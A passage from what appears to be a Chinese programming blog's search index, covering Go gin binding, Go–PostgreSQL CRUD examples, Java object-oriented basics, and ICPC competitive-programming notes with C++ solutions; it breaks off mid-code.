json为json格式的数据，binding和参数验证有关，当值为required为需要验证不能传空值，为-时不需要验证；相较于form，会优先选择json格式，json:“”中的值必须与前端参数的name一致 func test(context *gin.Context){ var information Teacher err := context.ShouldBind(\u0026information) //根据req的content type 自动推断如何绑定,form/json/xml等格式 if err != nil { context.JSON(400, gin.H{\"error\": err.Error()}) return } //这样就将获取的参数存储到了infomation变量里，通过访问结构体变量即可访问数据 }","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:2:1","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"参考资料:\r文档 | Gin Web Framework (gin-gonic.com) http请求中get和post方法的区别 - 知乎 (zhihu.com) ","date":"2024-06-11","objectID":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/:3:0","tags":["Go"],"title":"Go-gin教程与实战(1)","uri":"/posts/go-gin%E6%95%99%E7%A8%8B%E4%B8%8E%E5%AE%9E%E6%88%981/"},{"categories":["工程"],"content":"Go语言连接postgresql数据库并实现基础操作教程\r","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:0:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"安装依赖包\rgo get -u github.com/lib/pq 参考资料: https://godoc.org/github.com/lib/pq https://www.runoob.com/postgresql/postgresql-tutorial.html ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:1:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"基础操作\r","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:0","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"连接数据库\rimport ( \"database/sql\" \"fmt\" _ \"github.com/lib/pq\" ) func Database_connect() *sql.DB { localDB, err := sql.Open(\"postgres\", \"host=localhost port=5432 user=postgres password=123456 dbname=test sslmode=disable\") if err != nil { fmt.Println(\"Wrong args.Connected failed.\") panic(err) } err = localDB.Ping() //ping一下验证是否连通 if err != nil { fmt.Println(\"Wrong args.Connected failed.\") panic(err) } localDB.SetMaxOpenConns(20) //设置数据库连接池最大连接数 localDB.SetMaxIdleConns(10) //设置最大空闲连接数 fmt.Println(\"Local sql Successfully connected!\") return localDB }sql.Open()函数第一个参数为驱动的名字即\"postgres\"，第二个参数是数据库信息，分别是ip、端口、数据库用户名、密码、数据库的名字、sslmode 参数用于指定数据库连接时使用的 SSL 加密模式。函数返回一个连接池的指针，只有在需要的时候才会和数据库之间产生连接。 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:1","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"查找\rrows， err := db.Query(\"select * from test where name = $1\", myname) //(\"select 参数，参数(*表示全部参数) from 表的名字 where 参数 = $1 and 参数=$2(限制条件)\", 变量名, 变量名) if err != nil{ panic(err)//检查错误，panic会直接报错并停止程序，也可以用其他方式打印出报错，但不停止程序 } 生成的rows是一个结果集，需要用Next()方法遍历结果集 for rows.Next(){ var 变量1 数据类型 ... err = rows.Scan(\u0026变量1, \u0026...)//存储数据到创建的变量中 if err != nil{ //检查错误 } //这样就将数据库里一行的数据存储下来，遍历完数据集，便得到所有符合要求的数据 } err := db.QueryRow(\"select * from test where name = $1\", myname).Scan(\u0026参数 ....)//查询数据库中的一行并存储到变量中 var count int err := db.QueryRow(\"select count(*) from test where name = $1\", myname).Scan(\u0026count)//查询数据库中名字为myname变量值的数据行数，有时候需要提前检查是否存在数据，可以用count的方法检查 //可以用postgresql语法中的关键字、函数来辅助查询如max、min、DISTINCT等等 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:2","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"增加and更新\r_, err = db.Exec(\"insert into test (name, password) values ($1, $2)\", myname, mypassword)//向test表中添加一行，其中name和password列的值为myname和mypassword if err != nil{ //检查错误 } _, err = db.Exec(\"update test set password = $1 where name = $2\", newpassword, myname)//更新test表中name为myname的行，令password等于newpassword if err != nil{ //检查错误 }","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:3","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"删除\r_, err = db.Exec(\"delete from test where name = $1\", myname)//删除test表中name为myname的行 _, err = db.Exec(\"drop table test\")//删除test表 _, err = db.Exec(\"alter table table_name drop column column_name;\")//删除table_name表中名为column_name的列 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:4","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"创建表\r_, err = db.Exec(\"create table if not exists test(name text, password text)\")//创建test表如果不存在的话，有两个列分别是name和password _, err = db.Exec(\"alter table table_name add column_name datatype;\")//向table_name表添加数据类型为datatype的列名为column_name ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:5","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"模糊查找\rrows, err := db.Query(\"select * from tesst where name ilike $1\", myname) // 使用like模糊查找，ilike表示不分大小写 当myname = chen%时表示查找所有name前缀中有chen的行 当myname = %chen%时表示查找所有name中包含chen的行，如mychen, mychenmy","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:6","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["语言"],"content":"【从0开始学JAVA】 类个，我的对象在哪里？\r由于本人是从C开始学习的编程菜鸟，虽然接触过一点cpp(对现在的我来说也许只是c + stl库？只是为了写算法题方便一些…)，所以我打算先学JAVA的特点和思想————面向对象编程。 （至于安装JAVA可以看我*兄弟的博客*) ","date":"2024-06-11","objectID":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/:0:0","tags":["JAVA"],"title":"JAVA面向对象","uri":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"categories":["语言"],"content":"类个，总而言之，先给自己NEW一个对象吧\r面向对象 面向对象(Object Oriented)是软件开发方法，一种编程范式。面向对象的概念和应用已超越了程序设计和软件开发，扩展到如数据库系统、交互式界面、应用结构、应用平台、分布式系统、网络管理结构、CAD技术、人工智能等领域。面向对象是一种对现实世界理解和抽象的方法，是计算机编程技术发展到一定阶段后的产物。\r面向对象是相对于面向过程来讲的，面向对象方法，把相关的数据和方法组织为一个整体来看待，从更高的层次来进行系统建模，更贴近事物的自然运行模式。————来自*百度百科; 面向对象有三大基本特征： 封装 继承 多态 面向对象的编程思想就是把事物看作一个整体，从事物的特征（属性）和行为（方法）两个方面进行描述。 面向对象是找对象、创建对象、使用对象、维护对象的关系的过程 类 和 对象是什么？ 抛开对象不谈，我还是有对象的。类(Class) 是具有相同特性（数据元素）和行为（功能）的对象的抽象。 定义类：就是定义类的成员，包括成员变量和成员方法 类的成员: 成员属性：对象事物的属性； 成员方法：对象事物的方法(捏造对象的方法，处理对象行为的方法等等) 该类对象中每一个对象都具有类的成员属性，都可以使用类的成员方法。 有点类似C语言中的结构体，成员属性就是结构体中函数的变量，成员方法就是结构体中包含的函数，而每一个对象都是一个结构体。 public class 类名{ //成员变量 //成员方法 } struct human { int age；//成员变量 int (*)sleep()//成员方法 }对象(Object) 的含义是指具体的某一个事物，即在现实生活中能够看得见摸得着的事物。 在JAVA这类静态语言中，类是对象的抽象，对象是类的实例化。 创建对象 类名 对象名 = new 类名() 调用对象 对象名.成员变量\r对象名.方法(参数列表) 面向对象的编程方法，首先我们要找到对象，思考对象具有什么属性，然后创建一个对象。 public class human { int age; String name; public human() { // 没有参数的构造方法 // 构造对象的方法，方法名与类名要相同 name = \"李华\"; age = 18; }// 构造一个名为李华，年龄为18岁的对象 public human(String human_name, int human_age) { // 有参数的构造方法 this.name = human_name; this.age = human_age; // this代表它所在方法所属对象的引用。哪个对象调用的this所在的方法，this就代表哪个对象。当然this还有其他作用 }// 构造一个名为human_name,年龄为human_age的对象 /* * public huamn(){ * this(\"李华\",18); * //this在构造方法第一行时且带有参数列表，则代表引用了该类下其他的捏造方法(根据参数列表选择)； * } */ public void sleep(int time) { System.out.println(this.name + \"睡了\" + time + \"小时\"); } public static class new_human extends human {// 子类继承父类 静态的main不能调用动态类中的方法，所以要在类前加static才能在main中调用这个类，构造子类的对象 int tail;// 子类自己的变量 public new_human() {// 构造子类对象 super();// super关键字，引用父类的变量、方法 } public new_human(String human_name, int age) { super(human_name, age); } public new_human(String human_name, int age, int tail) { this.name = human_name; this.age = age; this.tail = tail; }// 子类自己的构造方法 } public static void main(String[] args) { human first = new human(); human second = new human(\"小明\", 18); System.out.println(\"名字:\" + first.name + \" 年龄:\" + first.age); System.out.println(\"名字:\" + second.name + \" 年龄:\" + second.age); first.sleep(8); second.sleep(7); new_human third = new new_human(); new_human fourth = new new_human(\"张三\", 18); new_human fifth = new new_human(\"李四\", 20, 186); System.out.println(\"名字:\" + third.name + \" 年龄:\" + third.age); System.out.println(\"名字:\" + fourth.name + \" 年龄:\" + fourth.age); System.out.println(\"名字:\" + fifth.name + \" 年龄:\" + fifth.age + \"身高(cm):\" + fifth.tail); } } 输出结果： 名字:李华 年龄:18 名字:小明 年龄:18 李华睡了8小时 小明睡了7小时 名字:李华 年龄:18 名字:张三 年龄:18 名字:李四 年龄:20身高(cm):186 super关键字： 表示当前类的父类的引用 只能出现在有继承关系的子类中 super两种用法： super.属性名、super.方法名(参数列表) 表示父类的属性和方法，和子类中的属性或方法重名时使用 super(参数列表) 出现在子类构造方法的第一句代码时 就是通过参数列表匹配父类的构造方法来创建父类对象 ##面向对象的三大基本特性： 封装 封装是将代码及其处理的数据绑定在一起的一种编程机制，该机制保证了程序和数据都不受外部干扰且不被误用。 封装的目的在于保护信息，保证数据的安全性 封装包括两个方面：属性的封装和方法的封装 Java 提供了私有和公有的访问模式，类的公有接口代表外部的用户应该知道或可以知道的每件东西，私有的方法数据只能通过该类的成员代码来访问， 封装不是绝对的封装，如果想要访问封装起来的数据，可以通过指定的入口即可 属性和方法的封装两者时相辅相成、密不可分的 继承 程序中的继承性是指子类拥有父类的全部特征和行为，这是类之间的一种关系。 继承的特点： 继承要有一定的层次结构，而且还要具备一定的可传递性 子类继承了父类的所有属性和方法，但是不包括私有属性（private）和构造方法 子类继承父类的属性和方法同时也可以有自己的属性和方法。 Java 只支持单继承。 也就是说一个子类只能有一个父类，父类可以有多个子类 继承可以减少重复代码、提高了复用性和维护性 继承让类与类之间产生了关系，类的耦合性增强了，父类发生变化子类也会跟着改变 多态 多态就是同一函数在不同类中有不同的实现； 面向对象的多态性，即“一个接口，多个方法”。 多态性体现在父类中定义的属性和方法被子类继承后，可以具有不同的属性或表现方式。 //在子类中修改父类方法，实现同一接口不同方法，如 father.sleep() son.sleep()同一个sleep接口，但根据不同父、子类出现不同结果 多态性允许一个接口被多个同类使用，弥补了单继承的不足。 ","date":"2024-06-11","objectID":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/:1:0","tags":["JAVA"],"title":"JAVA面向对象","uri":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"categories":["ICPC"],"content":"DP\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D-圆_牛客练习赛122 )\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"3077. K 个不相交子数组的最大能量值\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F-三途川的摆渡人_牛客周赛 Round 37 (nowcoder.com)\r代码：\r#include\u003cbits/stdc++.h\u003e using namespace std; void solve() { int n; cin \u003e\u003e n; vector\u003cint\u003e a(n); for (auto \u0026i : a) cin \u003e\u003e i; sort(a.begin(), a.end()); a.erase(unique(a.begin(), a.end()), a.end()); vector\u003carray\u003cint, 2\u003e\u003e dp(210,{1000000000, 1000000000}); for (int i = 0; i \u003c (int)a.size(); i ++) { dp[a[i]][1] = 1; for (int j = 0; j \u003c= 200; j ++) { dp[j \u0026 a[i]][1] = min(dp[j \u0026 a[i]][1], dp[j][0] + 1); } for (int j = 0; j \u003c= 200; j ++) dp[j][0] = dp[j][1]; } if (dp[0][0] \u003e n) cout \u003c\u003c -1 \u003c\u003c endl; else cout \u003c\u003c n - dp[0][0] \u003c\u003c endl; } int main(){ int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Minimize Sum of Distances (atcoder.jp)\r思路\r换根DP(时间复杂度、换相邻节点为根后f值变化的规律) dfs计算每个子树的C之和，以及以1为root的树的f值。 从1开始dfs换根，换根i之后的f值为f(fa) - sumC(i) + (sumC[1] - sumC[i]) Code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 100010; ll h[N], e[N\u003c\u003c1], ne[N \u003c\u003c 1], idx, c[N]; ll sumC[N]; ll sum = 0; ll ans = 1e18; void add(int a,int b){ e[++idx] = b; ne[idx] = h[a]; h[a] = idx; } void dfs(int pos, int fa, ll cnt){ sumC[pos] = c[pos]; sum += cnt * c[pos]; for(int i = h[pos]; i != -1; i = ne[i]){ int j = e[i]; if(j == fa) continue; dfs(j, pos, cnt + 1); sumC[pos] += sumC[j]; } } void dfs1(int pos, int fa, ll temp){ ll tmp = temp - sumC[pos] + sumC[1] - sumC[pos]; ans = min(ans, tmp); for(int i = h[pos]; i != -1; i = ne[i]){ int j = e[i]; if(j == fa) continue; dfs1(j, pos, tmp); } } void solve(){ int n; cin \u003e\u003e n; for(int i = 0; i \u003c n - 1; i++){ int a, b; cin \u003e\u003e a \u003e\u003e b; add(a, b), add(b, a); } for(int i = 1; i \u003c= n; i++) cin \u003e\u003e c[i]; dfs(1,0,0); ans = sum; for(int i = h[1]; i!= -1; i = ne[i]){ dfs1(e[i],1, sum); } cout \u003c\u003c ans \u003c\u003c '\\n'; } int main() { memset(h, -1, sizeof h); ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:4","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E-来硬的 01背包\rcode:\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll x[1000010], y[1000010]; ll dp[1000010][2]; int main(){ ll n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e x[i] \u003e\u003e y[i]; memset(dp, 0x3f, sizeof dp); dp[0][0] = 0; for(int i = 1; i \u003c= n; i++){ for(int j = m - 1; j \u003e= 0; j--){ dp[min(j + x[i], m)][0] = min(dp[min(j + x[i], m)][0], dp[j][0] + y[i]); dp[min(j + x[i], m)][1] = min(dp[min(j + x[i], m)][1], dp[j][1] + y[i]); dp[min(j + 2 * x[i], m)][1] = min(dp[min(j + x[i] * 2, m)][1], dp[j][0] + y[i] / 2); } } cout \u003c\u003c min(dp[m][0], dp[m][1]); return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:5","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Toward 0 求期望\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:6","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"2024 湖北省赛 Problem - H 状态压缩DP\r思路：\r用十位四进制数表示鱼塘中剩下的鱼，每一位是一个块内剩下的鱼，将(sum)4 变为(0)4。 枚举5*k个位置投放i枚炸弹后的状态转移 在i,j位置放x枚炸弹，使得五个位置中减少的鱼的数量的状态位四进制数(x)4 枚举当前所有的状态，对每一个状态和这个四进制数进行check，每一个四进制位取两者的最小值（能够改变的状态）得到一个新的四进制数tmp，并记录实际有效的炸弹数量cnt，则状态转移方程为dp[key - tmp] = min(dp[key - tmp], dp[key] + cnt); 最后答案即为dp[0] code:\r#include \u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll mp[1010][1010]; ll dx[] = {0, 0,1,0,-1}; ll dy[] = {0,1,0,-1,0}; ll pos[1010][1010]; ll st[1010][1010]; ll idx = 0; ll dp[2000010]; ll pow4[20]; ll num = 0; ll check(ll a, ll b){ ll res = 0; num = 0; ll cnt = 0; while(b){ ll f1 = a % 4; ll f2 = b % 4; res += pow4[cnt] * min(f1, f2); num = max(num, min(f1, f2));//实际生效的炸弹数量 b /= 4; a /= 4; cnt++; } return res; //a状态-res后转移到新状态 } void solve(){ set\u003cll\u003e all; ll n, m, k; scanf(\"%lld%lld%lld\", \u0026n, \u0026m, \u0026k); ll mx = 0; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++) pos[i][j] = -1; vector\u003cpair\u003cint, int\u003e\u003e f; for(int i = 1; i \u003c= k; i++){ ll x, y, a; scanf(\"%lld%lld%lld\", \u0026x, \u0026y, \u0026a); mp[x][y] = a; mx += pow4[idx] * a; pos[x][y] = idx++;//每一个有鱼的块对于四进制数中的一位 for(int q = 0; q \u003c 5; q++){ ll xx = x + dx[q], yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; f.push_back({xx,yy}); } } for(int i = 0; i \u003c= mx; ++i) dp[i] = 0x3f; dp[mx] = 0; all.insert(mx); for(auto [x,y]:f){//枚举每一个可以投掷炸弹的位置 if(st[x][y]) continue;//重叠的区域 st[x][y] = 1; for(ll i = 1; i \u003c= 3; i++){ ll boom = 0; for(ll q = 0; q \u003c 5; q++){ ll xx = x + dx[q]; ll yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; if(pos[xx][yy] \u003e -1){ boom += pow4[pos[xx][yy]] * i; } } for(auto key:all){//枚举所有状态 ll tmp1 = check(key, boom); if(tmp1 \u003e key) continue; dp[key - tmp1] = min(dp[key - tmp1], dp[key] + num); all.insert(key - tmp1);//添加新状态 } } } printf(\"%lld\\n\", dp[0]); } int main() { pow4[0] = 1; for(int i = 1; i \u003c= 11; i++){ pow4[i] = pow4[i - 1] * 4;//4的幂次 } int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:7","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"Problem - H 多重背包 二进制优化\r思路\r构造两个数组，使两数组按照以下规则操作后构成给定的序列P： 1.两数组都为空，则停止操作 2.任意一个数组为空，将另一个非空数组的首个元素弹出并放到P序列的末尾 3.两数组都不空，将两数组首个元素中较小的元素弹出并放到P序列末尾 性质： 1.在P序列中，假设第i位为x，则在x之后直到第一个比x大的数出现，中间的数都和x绑定在同一个侧数组中。如5 1 2 3 6，5、1、2、3都必须在同一侧的数组中，且顺序固定。 2.在考虑性质1后，P序列按照顺序分为了若干个不可分割的小块，要想成功构造P序列，需要用这若干的小块按照相对次序将两个数组填满，此时不需要关注每个小块内部的数了，只需要关注小块的长度。所有小块长度和为2n，所以只需要填满一个长为n的数组即可。则转变为背包问题，考虑m个物品能否装满一个容量为n的背包，每个物品可能有多个，为多重背包模型，使用二进制优化。 code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; int p[500010]; void solve(){ unordered_map\u003cint, int\u003e mp; int n; cin \u003e\u003e n; vector\u003cint\u003e dp(n / 2 + 1, 0); dp[0] = 1; int pos = 0; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e p[i]; if(p[i] == n) pos = i; } if(pos \u003c= n / 2){ cout \u003c\u003c \"No\" \u003c\u003c '\\n'; return; } int mx = 0; for(int i = 1; i \u003c= n / 2; i++){ mx = max(mx, p[i]); } if(p[n / 2 + 1] \u003e mx) { cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; return; } int l = 1; for(int i = 2; i \u003c= n; i++){ if(p[i] \u003e p[l]){ mp[i - l]++; l = i; } } mp[n + 1 - l]++; for(auto [k, v]: mp){ vector\u003cint\u003e f; for(int i = 1; i \u003c= v; i *= 2){ if(v \u003e= i){ f.push_back(i); v -= i; }else{ break; } } if(v \u003e 0) f.push_back(v); for(int i = 0; i \u003c f.size() ; i++){ for(int j = n / 2; j \u003e= k * f[i]; j--){ if(dp[j - k * f[i]]) dp[j] = 1; } } } if(dp[n / 2]) cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; else cout \u003c\u003c \"No\" \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:8","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"DS\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F - Second Largest Query\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F-小红的好子串询问 树状数组 子串变形\r思路\r首先需要推出一个结论，即当只有三个字符时，要时字符串中不存在回文串，那么这个字符串必然是一个由r、e、d组成的循环串（6种，red、rde、erd、edr、dre、der） 所以一个字符串要变成没有回文串的条件就是成为循环串，最小修改次数就是在6种情况下取最小值。 首先预处理一遍6种状态，用前缀和维护从1到i修改为循环串所需要的更改次数，子串[i,j]的修改次数即为sum[j] - sum[i - 1] 如果不考虑修改，只考虑查询，这道题就已经结束了。 如果考虑修改，则需要使用树状数组维护前缀和数组，优化区间修改。假设修改第i个字符，那么会改变[i,n]的前缀和的值，使用树状数组维护可以将O(n)的复杂度优化为O(log2n)。 使用前缀和数组的差分数组建立树状数组，再使用单点修改和单点查询即可 code\rstring a[6] = {\"red\", \"rde\", \"erd\", \"edr\", \"dre\", \"der\"}; int dp[6][100010]; class treeset{ public: int n; ll tree[100010]; treeset(int x){ this-\u003en = x; for(int i = 0; i \u003c= x; i++) this-\u003etree[i] = 0; } int lowbit(int x){return x \u0026 -x;} void add(int x, ll val){ for(int i = x; i \u003c= n; i += lowbit(i)) tree[i] += val; } ll query(int x) { ll sum = 0; for(int i = x; i \u003e= 1; i -= lowbit(i)) sum += tree[i]; return sum; } ll queryLR(int l, int r) { ll sum1 = 0, sum2 = 0; for(int i = l - 1; i \u003e= 1; i -= lowbit(i)) sum1 += tree[i]; for(int i = r; i \u003e= 1; i -= lowbit(i)) sum2 += tree[i]; return sum2 - sum1; } void update(int l, int r, ll val){ for(int i = l; i \u003c= n; i += lowbit(i)) tree[i] += val; for(int i = r + 1; i \u003c= n; i += lowbit(i)) tree[i] -= val; }; ll querypoint(int x){ ll ret = 0; for(int i = x; i \u003e= 1; i -= lowbit(i)) ret += tree[i]; return ret; } }; void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; string s; cin \u003e\u003e s; s = \"?\" + s; for(int i = 0; i \u003c 6; i++) for(int j = 1; j \u003c= n; j++){ dp[i][j] = dp[i][j - 1] + (a[i][j % 3] != s[j]); } vector\u003ctreeset\u003e ans; for(int i = 0; i \u003c 6; i++){ ans.push_back(treeset(n)); for(int j = 1; j \u003c= n; j++){ ans[i].add(j, dp[i][j] - dp[i][j - 1]); } } while(m--){ int op; cin \u003e\u003e op; if(op == 1){ int x; char ch; cin \u003e\u003e x \u003e\u003e ch; int tmp = s[x]; if(ch != tmp){ int l = x; x %= 3; for(int i = 0; i \u003c 6; i++){ if(a[i][x] == tmp){ ans[i].update(l, n, 1); }else if(a[i][x] == ch){ ans[i].update(l, n, -1); } } s[l] = ch; } }else{ int l, r; cin \u003e\u003e l \u003e\u003e r; ll ret = 1e9; for(int i = 0; i \u003c 6; i++) ret = min(ret, ans[i].querypoint(r) - ans[i].querypoint(l - 1)); cout \u003c\u003c ret \u003c\u003c '\\n'; } } }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E-小A的任务_堆\r思路\rn个A任务、B任务 先做A任务再做B任务。完成k个b任务的最小值显然等于min(前i个a的和 + 前i个b中最小的k个)枚举i从k到n 用大根堆维护k个b，每次检验新的b是否比堆顶小，若小则弹出并更新ans。 code\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ ll n, q; cin \u003e\u003e n \u003e\u003e q; vector\u003cll\u003e a(n + 1), b(n + 1); vector\u003cll\u003e sum(n + 1); for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e a[i]; sum[i] = sum[i - 1] + a[i]; } for(int i = 1; i \u003c= n; i++) cin \u003e\u003e b[i]; while(q--){ int k; cin 